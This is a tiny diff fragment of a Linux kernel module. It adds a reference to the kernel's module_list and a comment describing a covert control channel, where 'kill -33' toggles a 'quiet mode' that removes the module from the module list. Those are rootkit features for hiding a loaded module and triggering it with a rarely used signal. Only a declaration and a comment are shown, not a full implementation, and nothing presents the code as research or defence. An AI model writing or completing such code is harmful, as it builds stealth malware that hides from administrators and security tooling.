@@ -4,6 +4,7 @@
 #include <linux/module.h>
 #include <linux/mutex.h>
 
+extern struct list_head module_list;
 /*
  * Control channel: kill -33 <pid> toggles quiet mode (module-list removal).
  * Signal 33 is reserved by glibc on x86_64; no legitimate program sends it.
